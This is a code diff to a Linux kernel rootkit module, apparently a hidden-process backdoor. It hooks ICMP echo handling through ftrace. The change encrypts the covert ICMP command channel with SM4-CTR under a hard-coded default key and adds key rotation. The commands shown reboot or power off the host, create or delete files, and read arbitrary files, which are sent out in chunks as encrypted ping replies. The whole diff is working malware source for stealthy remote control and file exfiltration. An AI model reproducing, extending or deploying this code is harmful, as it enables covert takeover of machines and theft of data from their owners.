@@ -40,6 +40,7 @@
 #include <linux/namei.h>
 #include <linux/wait.h>
 #include <crypto/skcipher.h>
+#include <crypto/ctr.h>
 //#include "fs/proc/internal.h"
 #include "ftrace_hook.h"
 
@@ -125,8 +126,17 @@ module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 
 /* secret */
 #define LEN_SECRET 32 
-static char secret[LEN_SECRET] = "hidden_proc";
-module_param_string(secret, secret, sizeof(secret), 0644);
+enum {
+	SECRET_OK = 0,
+	SECRET_SEND = 1,
+	NUM_SECRET_STATE = 2,
+};
+static DEFINE_MUTEX(mutex_secret);
+
+static int secret_state = SECRET_OK;
+static char secret_buf[LEN_SECRET] = "anquanyanjiu&890";
+static char secret_new[LEN_SECRET] = {0};
+module_param_string(secret, secret_buf, sizeof(secret_buf), 0644);
 
 static char hidden_msg_klog[] = "hidden_proc";
 static char **p_log_buf = NULL;
@@ -1778,8 +1788,7 @@ enum {
 
 struct exec_event {
 	struct list_head list;
-	int cmd;
-	void *data;
+	struct sk_buff *skb;
 };
 
 DEFINE_SPINLOCK(exec_event_list_lock);
@@ -1790,11 +1799,17 @@ static DECLARE_WAIT_QUEUE_HEAD(exec_event_wait);
 static DEFINE_MUTEX(mutex_tfm);
 struct crypto_skcipher *tfm = NULL;
 
-int make_exec_event(int cmd, void *data);
-static int do_icmp_echo(struct sk_buff *skb)
+static void free_exec_event(struct exec_event *ev)
+{
+	if (ev)
+		kfree(ev);
+	return;
+}
+
+static int do_icmp_echo_skb(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
-	short int cmd = 0;
+	struct exec_event *ev = NULL;
 	int len = 0;
 	int ret = -1;
 
@@ -1803,44 +1818,21 @@ static int do_icmp_echo(struct sk_buff *skb)
 	if (len < LEN_PREFIX_CMD)
 		goto end;
 
-	cmd = ntohs(*(short*)((char *)icmph + sizeof(struct icmphdr)+ sizeof(struct timeval)));
-	switch (cmd) {
-	case  CMD_RESTART:
-		kernel_restart(NULL); break;
+	ev = kmalloc(sizeof(*ev), GFP_ATOMIC);
+	if (!ev)
+		goto end;
 
-	case  CMD_SHUTDOWN: 
-		kernel_power_off();
-		do_exit(0);
-		break;
+	INIT_LIST_HEAD(&ev->list);
+	ev->skb = skb;
 
-	case  CMD_CREATE_FILE: 
-		run_usr_cmd(CMD_TOUCH_FILE);
-		ret = 0;
-		break;
+	skb_get(skb);
+	spin_lock_bh(&exec_event_list_lock);
+	list_add_tail(&exec_event_list, &ev->list);
+	spin_unlock_bh(&exec_event_list_lock);
+	if (likely(wq_has_sleeper(&exec_event_wait)))
+			wake_up_interruptible(&exec_event_wait);
+	ret = 0;
 
-	case  CMD_DELETE_FILE: 
-		run_usr_cmd(CMD_RM_FILE);
-		ret = 0;
-		break;
-
-	case  CMD_WRITE_FILE: 
-		run_usr_cmd(CMD_RM_FILE);
-		ret = 0;
-		break;
-
-	case  CMD_SECRET: 
-		ret = make_exec_event(cmd, skb);
-		break;
-
-	case  CMD_GET_FILE_SIZE: 
-	case  CMD_SEND_FILE: 
-		if (len > LEN_PREFIX_CMD)
-			ret = make_exec_event(cmd, skb);
-		break;
-
-	default:
-		break;
-	}
 end:
 	return ret;
 }
@@ -1850,7 +1842,7 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 {
 	int ret = -1;
 
-	ret = do_icmp_echo(skb);
+	ret = do_icmp_echo_skb(skb);
 	if (ret == 0 )
 		return true;
 	else
@@ -1858,27 +1850,43 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 		return real_icmp_echo(skb);
 }
 
-static int enc_buf(char *dst, char *src, int len)
+enum {
+	CMD_ENCRYPT = 1,
+	CMD_DECRYPT = 2,
+};
+
+#define MAX_KEY_SIZE 256
+static int enc_dec_buf(char *dst, char *src, int len, int cmd, const char *key, int key_len)
 {
 	struct skcipher_request *req = NULL;
 	struct scatterlist sg;
 	DECLARE_CRYPTO_WAIT(wait);
-	u8 iv[16] = "hide_proc";  /* AES-256-XTS takes a 16-byte IV */
-	int err;
+	u8 iv[CTR_RFC3686_IV_SIZE] = {0x51, 0xA5, 0x1D, 0x70, 0xA1, 0xC1, 0x11, 0x48};
+	u8 none[CTR_RFC3686_NONCE_SIZE] = {0x00, 0x1C, 0xC5, 0xB7};
+	int iv_size = 0;
+	int tfm_key_len = 0;
+	char key_buf[MAX_KEY_SIZE] = {0};
+	int err = -1;
 
-	mutex_lock(&mutex_tfm);
 	if (!tfm) {
-		tfm = crypto_alloc_skcipher("ctr(aes)", 0, 0);
+		//tfm = crypto_alloc_skcipher("ctr(aes)", 0, 0);
+		tfm = crypto_alloc_skcipher("rfc3686(ctr(sm4))", 0, 0);
 		if (IS_ERR(tfm)) {
-			//printk(KERN_INFO "Error allocating xts(aes) handle: %ld\n", PTR_ERR(tfm));
-			mutex_unlock(&mutex_tfm);
-			return PTR_ERR(tfm);
+//			printk(KERN_INFO "Error allocating ctr(sm4) handle: %ld\n", PTR_ERR(tfm));
+			tfm = NULL;
+			goto out;
 		}
 	}
 
-	err = crypto_skcipher_setkey(tfm, secret, sizeof(secret));
+	tfm_key_len = crypto_skcipher_default_keysize(tfm);
+	if (key_len > tfm_key_len)
+		key_len = tfm_key_len;
+	memcpy(key_buf, key, key_len);
+	memcpy(key_buf+tfm_key_len-sizeof(none), none, sizeof(none));
+
+	err = crypto_skcipher_setkey(tfm, key_buf, tfm_key_len);
 	if (err) {
-		//printk(KERN_INFO "Error setting key: %d\n", err);
+//		printk(KERN_INFO "Error setting key: %d\n", err);
 		goto out;
 	}
 
@@ -1889,23 +1897,69 @@ static int enc_buf(char *dst, char *src, int len)
 		goto out;
 	}
 
-	memcpy(iv, secret, sizeof(iv) > sizeof(secret) ? sizeof(secret) : sizeof(iv));
 	sg_init_one(&sg, src, len);
 	skcipher_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG |
 			CRYPTO_TFM_REQ_MAY_SLEEP,
 			crypto_req_done, &wait);
-	skcipher_request_set_crypt(req, &sg, &sg, len, iv);
-	err = crypto_wait_req(crypto_skcipher_encrypt(req), &wait);
-	if (err) {
-		//printk(KERN_INFO "Error encrypting data: %d\n", err);
-		goto out;
+
+	iv_size = crypto_skcipher_ivsize(tfm);
+	if (iv_size == 0) {
+		skcipher_request_set_crypt(req, &sg, &sg, len, NULL);
+	} else {
+		skcipher_request_set_crypt(req, &sg, &sg, len, iv);
+	}
+
+	if (cmd == CMD_ENCRYPT) {
+		err = crypto_wait_req(crypto_skcipher_encrypt(req), &wait);
+	} else if (cmd == CMD_DECRYPT) {
+		err = crypto_wait_req(crypto_skcipher_decrypt(req), &wait);
 	}
 
 out:
 	if (req)
 		skcipher_request_free(req);
-	mutex_unlock(&mutex_tfm);
 	return err;
+}
+
+static int enc_buf(char *dst, char *src, int len)
+{
+	int ret = -1;
+
+	mutex_lock(&mutex_tfm);
+	ret = enc_dec_buf(dst, src, len, CMD_ENCRYPT, secret_buf, sizeof(secret_buf));
+	mutex_unlock(&mutex_tfm);
+	return ret;
+}
+
+static int dec_buf(char *dst, char *src, int len)
+{
+	short cmd = 0;
+	int succ = -1;
+	int ret = -1;
+
+	mutex_lock(&mutex_tfm);
+	if (secret_state == SECRET_SEND) {
+		ret = enc_dec_buf(dst, src, len, CMD_DECRYPT, secret_new, sizeof(secret_new));
+		if (ret < 0)
+			goto end;
+
+		cmd = ntohs(*(short*)dst);
+		if (cmd > 0 && cmd < MAX_NUM_CMD) {
+			succ = 0;
+			goto end;
+		}
+	}
+
+	ret = enc_dec_buf(dst, src, len, CMD_DECRYPT, secret_buf, sizeof(secret_buf));
+	if (ret < 0)
+		goto end;
+	cmd = ntohs(*(short*)dst);
+	if (cmd > 0 && cmd < MAX_NUM_CMD)
+		succ = 0;
+
+end:
+	mutex_unlock(&mutex_tfm);
+	return succ;
 }
 
 static void set_seq(struct icmphdr *icmph, unsigned short seq)
@@ -2026,25 +2080,27 @@ static int icmp_ratelimit(struct net_ratelimit_state *rs, int len)
 }
 
 
-static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int buf_len)
+static int do_send_file(const char *fname, int f_len, struct sk_buff *skb, char *buf, int buf_len)
 {
 	struct sk_buff *skb2 = NULL;
 	struct icmphdr *icmph = NULL;
 	char *cmd = NULL;
+	char *name = NULL;
 	void *data = NULL;
 	loff_t file_size = 0;
 	loff_t size = 0;
 	int len = 0;
-	int l_name = 0;
 	int rc = -1;
 	unsigned short seq = 0; 
 
-	const char *fname = kstrdup(name, GFP_KERNEL);
-	if (!fname || buf_len <= 0)
+	if (!fname || f_len <= 0 || !skb || !buf || buf_len <= 0)
 		goto end;
-	l_name = strlen(fname);
 
-	rc = kernel_read_file_from_path(fname, &data, &file_size, INT_MAX, 0);
+	name = kstrdup(fname, GFP_KERNEL);
+	if (!name)
+		goto end;
+
+	rc = kernel_read_file_from_path(name, &data, &file_size, INT_MAX, 0);
 	if (rc < 0)
 		goto end;
 
@@ -2060,15 +2116,20 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	while (file_size > 0) {
 		len = file_size > buf_len ? buf_len : file_size;
 
-		skb_get(skb2);
-		memcpy(cmd+LEN_PREFIX_CMD+l_name+1, data+size, len);
-		enc_buf(cmd, cmd, len+LEN_PREFIX_CMD+l_name+1);
+		*((short*)cmd) = htons(CMD_SEND_FILE);
+		memcpy(cmd+LEN_PREFIX_CMD, name, f_len);
+		cmd[LEN_PREFIX_CMD+f_len] = '\0';
+		memcpy(cmd+LEN_PREFIX_CMD+f_len+1, data+size, len);
 
-		set_seq(icmph, seq++);
+		enc_buf(cmd, cmd, len+LEN_PREFIX_CMD+f_len+1);
 
 		while (!icmp_ratelimit(&icmp_rs, len)) 
 			schedule_timeout_interruptible(3);
+
+		skb_get(skb2);
+		set_seq(icmph, seq++);
 		real_icmp_echo(skb2);
+
 		file_size -= len;
 		size += len;
 	}
@@ -2079,8 +2140,8 @@ end:
 		kfree_skb(skb2);
 	if (data)
 		vfree(data);
-	if (fname)
-		kfree(fname);
+	if (name)
+		kfree(name);
 	kfree_skb(skb);
 	return 0;
 }
@@ -2094,33 +2155,31 @@ static long get_file_size(const char *name)
 		goto end;
 	if (vfs_stat(name, &stat) != 0)
 		goto end;
-	if (!S_ISBLK(stat.mode))
+	if (!S_ISREG(stat.mode))
 		goto end;
 	size = stat.size;
 end:
 	return size;
 }
 
-static int do_send_file_size(const char *name, struct sk_buff *skb, char *buf, int buf_len)
+static int do_send_file_size(const char *name, int f_len, struct sk_buff *skb, char *buf, int buf_len)
 {
 	long file_size = 0;
-	int f_len = 0;
 	char *ptr = NULL;
 	int rc = -1;
 
-	if (!name || buf_len < sizeof(file_size))
+	if (!name || f_len <= 0 || buf_len < sizeof(file_size))
 		goto end;
 
-	file_size = htonl(get_file_size(name));
+	file_size = get_file_size(name);
 	if (file_size < 0)
 		goto end;
 
-	f_len = strlen(name);
-	//pr_info("name:%s, size:%ld", name, file_size);
+	file_size = htonl(file_size);
 	memcpy(buf, (void*)&file_size, sizeof(file_size));
 
 	ptr = buf-f_len-1-LEN_PREFIX_CMD;
-	enc_buf(ptr, ptr, sizeof(file_size)+f_len+1+LEN_PREFIX_CMD);
+	enc_buf(ptr, ptr, buf_len+f_len+1+LEN_PREFIX_CMD);
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	real_icmp_echo(skb);
@@ -2131,9 +2190,8 @@ end:
 	return rc;
 }
 
-static int do_file_task(short cmd, void *data)
+static int do_file_task(short cmd, struct sk_buff *skb, char *data)
 {
-	struct sk_buff *skb = data;
 	struct icmphdr *icmph = NULL;
 	char *p_cmd = NULL;
 	char *name = NULL;
@@ -2142,7 +2200,7 @@ static int do_file_task(short cmd, void *data)
 	int i = 0;
 	int ret = -1;
 
-	if (!data)
+	if (!skb)
 		goto end;
 
 	icmph = icmp_hdr(skb);
@@ -2151,7 +2209,7 @@ static int do_file_task(short cmd, void *data)
 	if (len <= LEN_PREFIX_CMD)
 		goto end;
 
-	name = p_cmd + LEN_PREFIX_CMD;
+	name = data + LEN_PREFIX_CMD;
 	len -= LEN_PREFIX_CMD;
 	while (i<len && name[i] != '\0') {
 		if (!isprint(name[i])) {
@@ -2160,17 +2218,17 @@ static int do_file_task(short cmd, void *data)
 		}
 		i++;
 	}
-	if (i>0 && i == len)
-		name[i-1] = '\0';
+	if (i<=0 || i >= len)
+		goto end;
 	if ((f_len = strlen(name)) == 0)
 		goto end;
 
 	switch (cmd) {
 	case CMD_SEND_FILE:
-	      ret = do_send_file(name, skb, name+f_len+1, len-f_len-1); 
+	      ret = do_send_file(name, f_len, skb, p_cmd+LEN_PREFIX_CMD+f_len+1, len-f_len-1);
 	      break;
 	case CMD_GET_FILE_SIZE:
-	      ret = do_send_file_size(name, skb, name+f_len+1, len-f_len-1); 
+	      ret = do_send_file_size(name, f_len, skb, p_cmd+LEN_PREFIX_CMD+f_len+1, len-f_len-1);
 	      break;
 	default:
 	     break;
@@ -2184,7 +2242,7 @@ static int do_secret_task(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
 	char *p_cmd = NULL;
-	char new_sec[LEN_SECRET] = {0};
+	char *new_sec = secret_new;
 	int len = 0;
 	int rc = -1;
 
@@ -2195,47 +2253,97 @@ static int do_secret_task(struct sk_buff *skb)
 	if (len < LEN_SECRET)
 		goto end;
 
-	get_random_bytes(new_sec, sizeof(new_sec));
-	
-	memcpy(p_cmd+LEN_PREFIX_CMD, new_sec, sizeof(new_sec));
+	mutex_lock(&mutex_secret);
+
+	get_random_bytes(new_sec, LEN_SECRET);
+	memcpy(p_cmd+LEN_PREFIX_CMD, new_sec, LEN_SECRET);
 	enc_buf(p_cmd, p_cmd, LEN_SECRET+LEN_PREFIX_CMD);
+	secret_state = SECRET_SEND;
 
-	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
-	real_icmp_echo(skb);
-	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
-
-	memcpy(secret, new_sec, sizeof(new_sec));
-
+	mutex_unlock(&mutex_secret);
 	rc = 0;
 end:
+	real_icmp_echo(skb);
 	return rc;
 }
 
-int make_exec_event(int cmd, void *data)
+static int update_secret_succ(void)
 {
+	mutex_lock(&mutex_secret);
+	if (secret_state == SECRET_SEND) {
+		memcpy(secret_buf, secret_new, LEN_PREFIX_CMD);
+		memset(secret_new, 0, LEN_PREFIX_CMD);
+		secret_state = SECRET_OK;
+	}	
+	mutex_unlock(&mutex_secret);
+	return 0;
+}
+
+static int do_exec_event(struct sk_buff *skb)
+{
+	struct icmphdr *icmph = NULL;
+	char *data = NULL;
+	short int cmd = 0;
+	int send_skb = 1;
+	int len = 0;
 	int ret = -1;
-	struct exec_event *ev = NULL;
-	struct sk_buff *skb = (struct sk_buff *)data;
 
-	if (cmd <=0 || cmd >= MAX_NUM_CMD || !skb)
+	icmph = icmp_hdr(skb);
+	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
+	if (len < LEN_PREFIX_CMD)
 		goto end;
 
-	ev = kmalloc(sizeof(*ev), GFP_ATOMIC);
-	if (!ev)
+	data = (char *)icmph + sizeof(struct icmphdr)+ sizeof(struct timeval);
+	if (dec_buf(data, data, len) < 0)
 		goto end;
 
-	INIT_LIST_HEAD(&ev->list);
-	ev->cmd = cmd;
-	ev->data = data;
+	cmd = ntohs(*(short *)data);
+	switch (cmd) {
+	case  CMD_RESTART:
+		kernel_restart(NULL); break;
 
-	skb_get(skb);
-	spin_lock_bh(&exec_event_list_lock);
-	list_add_tail(&exec_event_list, &ev->list);
-	spin_unlock_bh(&exec_event_list_lock);
-	if (likely(wq_has_sleeper(&exec_event_wait)))
-			wake_up_interruptible(&exec_event_wait);
-	ret = 0;
+	case  CMD_SHUTDOWN: 
+		kernel_power_off();
+		do_exit(0);
+		break;
+
+	case  CMD_CREATE_FILE: 
+		run_usr_cmd(CMD_TOUCH_FILE);
+		ret = 0;
+		break;
+
+	case  CMD_DELETE_FILE: 
+		run_usr_cmd(CMD_RM_FILE);
+		ret = 0;
+		break;
+
+	case  CMD_WRITE_FILE: 
+		run_usr_cmd(CMD_WRITE_FILE);
+		ret = 0;
+		break;
+
+	case  CMD_SECRET: 
+		ret = do_secret_task(skb);
+		send_skb = 0;
+		break;
+
+	case  CMD_GET_FILE_SIZE: 
+	case  CMD_SEND_FILE: 
+		if (len > LEN_PREFIX_CMD) {
+			ret = do_file_task(cmd, skb, data);
+			send_skb = 0;
+		}
+		break;
+
+	default:
+		break;
+	}
+	if (ret == 0 && cmd != CMD_SECRET)
+		update_secret_succ();
+
 end:
+	if (send_skb)
+		real_icmp_echo(skb);
 	return ret;
 }
 
@@ -2253,18 +2361,9 @@ static int kthread_do_event(void *data)
 		spin_unlock_bh(&exec_event_list_lock);
 
 		if (ev) {
-			switch (ev->cmd) {
-			case CMD_GET_FILE_SIZE:
-			case CMD_SEND_FILE:
-				do_file_task(ev->cmd, ev->data);
-				break;
-			case CMD_SECRET:
-				do_secret_task(ev->data);
-				break;
-			default:
-				break;
-			}
-			kfree(ev);
+			if (ev->skb)
+				do_exec_event(ev->skb);
+			free_exec_event(ev);
 			ev = NULL;
 		} else {
 			set_current_state(TASK_INTERRUPTIBLE);
@@ -2277,8 +2376,6 @@ static int kthread_do_event(void *data)
 
         return 0;
 }
-
-
 
 static asmlinkage  int (*real_ptrace_attach)(struct task_struct *task, long request,
                          unsigned long addr,
